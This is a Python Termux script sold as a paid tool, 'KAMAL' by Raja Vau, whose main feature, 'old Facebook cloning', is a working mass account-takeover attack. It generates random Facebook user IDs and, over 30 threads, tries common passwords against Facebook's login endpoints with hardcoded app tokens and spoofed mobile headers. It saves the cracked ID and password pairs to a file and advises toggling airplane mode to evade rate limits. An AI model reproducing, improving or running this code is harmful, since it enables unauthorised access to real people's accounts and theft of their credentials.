# -*- coding: utf-8 -*-
# KAMAL Signature Terminal — Native Termux Banner & Old Cloning
# Author : Raja Vau

import os
import shutil
import re
import webbrowser
import time
import uuid
import random
import sys
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup
import subprocess

# Prevent background process from being killed when minimized
try:
    os.system('termux-wake-lock')
except:
    pass

RESET = "\033[0m"
BOLD = "\033[1m"

def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

CYAN = rgb(34, 240, 255)
BLUE = rgb(48, 118, 255)
GREEN = rgb(40, 245, 154)
LIME = rgb(190, 255, 72)
WHITE = rgb(238, 248, 255)
MUTED = rgb(111, 137, 157)
PURPLE = rgb(190, 130, 255)
YELLOW = rgb(255, 220, 80)
RED = rgb(255, 60, 60)
PINK = rgb(255, 105, 180)

W = WHITE
Y = YELLOW
G = GREEN

# আপনার দেওয়া হোয়াটসঅ্যাপ কিউআর লিংক
WHATSAPP_QR_URL = "https://wa.me/qr/C6PGOFRBLLIDJ1"

# আপনার ইউটিউব এবং হোয়াটসঅ্যাপ গ্রুপ লিংক
YOUTUBE_URL = "https://youtube.com/@raja-vau-teach-world?si=UAamHC9JznLAV5uf"
WHATSAPP_GROUP_URL = "https://chat.whatsapp.com/BrVHKmNWVb58MOHHhvMtq0"

# Raw Key approval file link
KEY_LINK = "https://raw.githubusercontent.com/rajavau379-pixel/Raja/refs/heads/main/Key.txt"

def visible(text):
    return len(re.sub(r"\033\[[0-9;]*m", "", text))

def center(text, width):
    length = visible(text)
    if length >= width:
        return text
    return " " * ((width - length) // 2) + text

def gradient(text):
    colors = [CYAN, BLUE, GREEN, LIME, CYAN]
    return "".join(
        colors[i % len(colors)] + char
        for i, char in enumerate(text)
    ) + RESET

def slow_print(text, delay=0.015):
    width = max(32, shutil.get_terminal_size((80, 24)).columns)
    centered_text = center(text, width)
    for char in centered_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def pro_animation(text="Loading"):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for _ in range(8):
        for char in chars:
            sys.stdout.write(f"\r{CYAN} [ {char} ] {GREEN}{text} ...{RESET}")
            sys.stdout.flush()
            time.sleep(0.03)
    sys.stdout.write("\r\033[K")

def banner():
    width = max(32, shutil.get_terminal_size((80, 24)).columns)
    print()
    print(center(CYAN + BOLD + "K A M A L" + RESET + MUTED + "  /  " + GREEN + "SIGNATURE" + RESET, width))
    print(center(MUTED + "RAJA VAU TEACH WORLD" + RESET, width))
    print()

    if width >= 56:
        rows = [
            "██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗     ",
            "██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║     ",
            "█████╔╝ ███████║██╔████╔██║███████║██║     ",
            "██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║     ",
            "██║  ██╗██║  ██║██║ ╚═╝ ██║██║  ██║███████╗",
            "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝",
        ]
        for row in rows:
            print(center(gradient(row), width))
    else:
        print(center(BOLD + gradient("K A M A L") + RESET, width))

    print()
    print(center(WHITE + "DREAM" + CYAN + "  /  " + WHITE + "CODE" + BLUE + "  /  " + WHITE + "BUILD" + GREEN + "  /  " + WHITE + "EVOLVE" + RESET, width))
    print(center(CYAN + "·" * min(max(width - 12, 8), 42) + RESET, width))
    print()

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    banner()

# কিউ যেন ডিভাইসে স্থায়ী থাকে (বারবার পরিবর্তন না হয়)
def get_device_key():
    key_file = ".device_key.txt"
    if os.path.exists(key_file):
        try:
            with open(key_file, "r") as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        uid = subprocess.check_output('cat /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/ubuntu/etc/machine-id 2>/dev/null', shell=True).decode().strip()
        if not uid:
            uid = str(uuid.uuid4())
    except:
        uid = str(uuid.uuid4())
    
    new_key = "RAJA-VAP-" + uid[:8].upper()
    try:
        with open(key_file, "w") as f:
            f.write(new_key)
    except:
        pass
    return new_key

def open_link(url):
    try:
        os.system(f'xdg-open "{url}" > /dev/null 2>&1 &')
    except:
        try:
            os.system(f'am start -a android.intent.action.VIEW -d "{url}" > /dev/null 2>&1 &')
        except:
            webbrowser.open(url)

def approval():
    my_key = get_device_key()

    # অটোমেটিক ব্যাকগ্রাউন্ডে চেক করা যে অ্যাডমিন কিউ ডিলিট করেছে কিনা (Knockout system)
    try:
        res = requests.get(KEY_LINK, timeout=7).text
        if my_key not in res:
            # কিউ না থাকলে বা ডিলিট করলে সেশন ক্লিয়ার করে এপ্রুভাল স্ক্রিনে আটকে রাখা হবে
            pass
    except:
        pass

    # টুল রান হওয়ার সাথে সাথেই বা মেনুতে আসার আগে ইউটিউব ও হোয়াটসঅ্যাপ গ্রুপ লিংক ওপেন হবে
    open_link(YOUTUBE_URL)
    open_link(WHATSAPP_GROUP_URL)

    os.system('clear')
    banner()
    slow_print(YELLOW + BOLD + "★ UPDATE TOOL PRICE & ACCESS ★" + RESET)
    slow_print(CYAN + "────────────────────────────────────────" + RESET)
    slow_print(GREEN + " [🔰] 1 WEEK  : 2 DOLLARS" + RESET)
    slow_print(GREEN + " [🔰] 2 WEEKS : 4 DOLLARS" + RESET)
    slow_print(GREEN + " [🔰] 3 WEEKS : 15 DOLLARS" + RESET)
    slow_print(LIME + " [🔥] OFFER 1 MONTH : 25 DOLLARS" + RESET)
    slow_print(CYAN + "────────────────────────────────────────" + RESET)
    slow_print(WHITE + BOLD + " [1] ➔ CONTACT ADMIN FOR KEY" + RESET)
    slow_print(WHITE + BOLD + " [2] ➔ PREMIUM TOOL INFO" + RESET)
    slow_print(WHITE + BOLD + " [3] ➔ CHECK APPROVAL" + RESET)
    slow_print(WHITE + BOLD + " [4] ➔ EXIT TOOL" + RESET)
    slow_print(CYAN + "────────────────────────────────────────" + RESET)
    print(center(CYAN + f"Your Key: {my_key}" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
    print()

    choice = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOOSE OPTION : " + RESET).strip()

    if choice == '1':
        pro_animation("Connecting to WhatsApp")
        print(f"\n{GREEN}[•] Your Permanent Key: {WHITE}{my_key}{RESET}")
        time.sleep(1)
        open_link(WHATSAPP_QR_URL)
        input(MUTED + "\nPress ENTER to go back..." + RESET)
        approval()

    elif choice == '2':
        pro_animation("Loading Info")
        width = max(32, shutil.get_terminal_size((80, 24)).columns)
        print(center(PINK + "This is a Fully Fire Paid Tool managed by Raja Vau." + RESET, width))
        input(MUTED + "\nPress ENTER to go back..." + RESET)
        approval()

    elif choice == '3':
        pro_animation("Checking Approval Status")
        try:
            res = requests.get(KEY_LINK, timeout=10).text
            if my_key in res:
                print(center(GREEN + "Welcome to Raja Vau Teach World" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
                print(center(CYAN + "Your Key is Approved Successfully!" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
                time.sleep(2)
                return
            else:
                print(center(RED + "Your Key is Not Approved or Removed by Admin!" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
                print(center(YELLOW + f"Key: {my_key}" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
                input(MUTED + "\nPress ENTER to try again..." + RESET)
                approval()
        except:
            print(center(RED + "Network Error! Check your internet." + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
            time.sleep(2)
            approval()

    elif choice == '4':
        print(YELLOW + "Exiting tool..." + RESET)
        sys.exit()
    else:
        print(RED + "Invalid Option!" + RESET)
        time.sleep(1)
        approval()

def show_menu():
    width = max(32, shutil.get_terminal_size((80, 24)).columns)
    print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
    print(center(CYAN + "║" + WHITE + BOLD + "          MAIN MENU               " + RESET + CYAN + "║" + RESET, width))
    print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))

    options = [
        ("01", "OLD FACEBOOK CLONING", GREEN),
        ("02", "FACEBOOK SECURITY LEARNING", CYAN),
        ("03", "CREATE NEW ACCOUNT", LIME),
        ("04", "YOUTUBE CHANNEL", BLUE),
        ("05", "WHATSAPP GROUP", PURPLE),
        ("00", "EXIT", YELLOW),
    ]

    for number, label, color in options:
        text = f"║ {color}[{number}]{RESET}  {WHITE}{label}{RESET}"
        padding = max(0, 33 - len(number) - len(label) - 3)
        text += " " * padding + CYAN + "║" + RESET
        print(center(text, width))

    print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
    print()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')) or uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return '2015'
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return '2015'

def get_country_flag(uid):
    flags = [
        ("IRAN 🇮🇷", "IRAN"),
        ("BANGLADESH 🇧🇩", "BANGLADESH"),
        ("INDIA 🇮🇳", "INDIA"),
        ("PAKISTAN 🇵🇰", "PAKISTAN"),
        ("INDONESIA 🇮🇩", "INDONESIA"),
        ("SAUDI ARABIA 🇸🇦", "SAUDI ARABIA"),
        ("MALAYSIA 🇲🇾", "MALAYSIA"),
    ]
    try:
        index = int(uid[-2:]) % len(flags)
        return flags[index][0]
    except:
        return "IRAN 🇮🇷"

def BNG_71_():
    while True:
        ____banner____()
        width = max(32, shutil.get_terminal_size((80, 24)).columns)
        print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
        print(center(CYAN + "║" + WHITE + BOLD + "          OLD CLONE MENU          " + RESET + CYAN + "║" + RESET, width))
        print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))
        print(center(CYAN + "║ " + GREEN + "[1]" + WHITE + " OLD CLONE SERIES             " + CYAN + "║" + RESET, width))
        print(center(CYAN + "║ " + YELLOW + "[0]" + WHITE + " BACK TO MAIN MENU            " + CYAN + "║" + RESET, width))
        print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
        print()
        __Jihad__ = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOICE : " + RESET).strip()
        if __Jihad__ in ('A', 'a', '01', '1'):
            old_clone()
            break
        elif __Jihad__ in ('0', '00'):
            run()
            break
        else:
            print(RED + "\n    Choose Valid Option... " + RESET)
            time.sleep(1.5)

def old_clone():
    while True:
        ____banner____()
        width = max(32, shutil.get_terminal_size((80, 24)).columns)
        print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
        print(center(CYAN + "║" + WHITE + BOLD + "        SELECT CLONE SERIES       " + RESET + CYAN + "║" + RESET, width))
        print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))
        print(center(CYAN + "║ " + GREEN + "[1]" + WHITE + " ALL SERIES                  " + CYAN + "║" + RESET, width))
        print(center(CYAN + "║ " + GREEN + "[2]" + WHITE + " 100003/4 SERIES             " + CYAN + "║" + RESET, width))
        print(center(CYAN + "║ " + GREEN + "[3]" + WHITE + " 2009 SERIES                 " + CYAN + "║" + RESET, width))
        print(center(CYAN + "║ " + YELLOW + "[0]" + WHITE + " BACK                        " + CYAN + "║" + RESET, width))
        print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
        print()
        _input = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOICE : " + RESET).strip()
        if _input in ('A', 'a', '01', '1'):
            old_One()
            break
        elif _input in ('B', 'b', '02', '2'):
            old_Tow()
            break
        elif _input in ('C', 'c', '03', '3'):
            old_Tree()
            break
        elif _input in ('0', '00'):
            BNG_71_()
            break
        else:
            print(RED + "\n[×] Choose Valid Option... " + RESET)
            time.sleep(1.5)

def old_One():
    user = []
    ____banner____()
    print(f"    {GREEN}[•] Old Code : 2010-2014{RESET}")
    ask = input(f"    {CYAN}[•] Select (1/2) : {RESET}")
    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
    linex_custom()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(f"    {GREEN}[1] Method A{RESET}")
    print(f"    {GREEN}[2] Method B{RESET}")
    linex_custom()
    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
        linex_custom()
        for mal in user:
            uid = star + mal
            if meth == '1' or meth.upper() == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    ____banner____()
    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
    linex_custom()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    print(f"    {GREEN}[1] Method A{RESET}")
    print(f"    {GREEN}[2] Method B{RESET}")
    linex_custom()
    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
        linex_custom()
        for uid in user:
            if meth == '1' or meth.upper() == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    ____banner____()
    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
    linex_custom()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append(prefix + suffix)
    print(f"    {GREEN}[1] Method A{RESET}")
    print(f"    {GREEN}[2] Method B{RESET}")
    linex_custom()
    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
        linex_custom()
        for uid in user:
            if meth == '1' or meth.upper() == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def linex_custom():
    print(CYAN + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + RESET)

oks = []
cps = []
loop = 0

def user_agent699():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r{CYAN}[KAMAL-M1] [{loop}] [SUCCESSFUL:{len(oks)}]{RESET}")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': user_agent699(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            try:
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=15).json()
            except:
                continue

            if 'session_key' in res:
                flag = get_country_flag(uid)
                print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
                print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                open('/sdcard/KAMAL-OLD-M1-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                flag = get_country_flag(uid)
                print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
                print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                open('/sdcard/KAMAL-OLD-M1-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception as e:
        pass

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r{CYAN}[KAMAL-M2] [{loop}] [SUCCESSFUL:{len(oks)}]{RESET}")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': user_agent699(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                try:
                    po = session.get(url, headers=headers, timeout=15).json()
                except:
                    continue

                if 'session_key' in str(po) or 'session_key' in po:
                    flag = get_country_flag(uid)
                    print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                    print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
                    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                    open('/sdcard/KAMAL-OLD-M2-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
    except Exception as e:
        pass
    loop += 1

def run():
    while True:
        os.system("clear")
        banner()
        show_menu()
        footer()

        choice = input(
            GREEN + "RAJA@TERMUX" + CYAN + " ➜ " + RESET
        ).strip()

        if choice == "1":
            BNG_71_()

        elif choice == "2":
            print(CYAN + "\nFACEBOOK SECURITY LEARNING" + RESET)
            print(WHITE + "Educational information and account safety." + RESET)
            input(MUTED + "\nPress ENTER to return to menu..." + RESET)

        elif choice == "3":
            webbrowser.open("https://www.facebook.com/")
            input(MUTED + "\nPress ENTER to return to menu..." + RESET)

        elif choice == "4":
            print(CYAN + "\nOpening YouTube Channel..." + RESET)
            open_link(YOUTUBE_URL)
            input(MUTED + "\nPress ENTER to return to menu..." + RESET)

        elif choice == "5":
            print(CYAN + "\nOpening WhatsApp Group..." + RESET)
            open_link(WHATSAPP_GROUP_URL)
            input(MUTED + "\nPress ENTER to return to menu..." + RESET)

        elif choice == "0":
            print(GREEN + "THANK YOU FOR VISITING RAJA VAU TERMINAL!" + RESET)
            break

        else:
            print(YELLOW + "\nInvalid option. Please try again." + RESET)
            input(MUTED + "\nPress ENTER to return to menu..." + RESET)

def footer():
    width = max(32, shutil.get_terminal_size((80, 24)).columns)
    print()
    print(center(GREEN + "🇧🇩 FOR GOOD RESULTS 🇧🇩" + RESET, width))
    print(center(CYAN + "USE FLIGHT MODE OFF/ON" + RESET, width))
    print(center(YELLOW + "♥ EVERY 5 MINUTES ♥" + RESET, width))
    print()

if __name__ == "__main__":
    try:
        approval()
        run()
    except KeyboardInterrupt:
        print(RESET + "\nExiting RAJA VAU Terminal...")
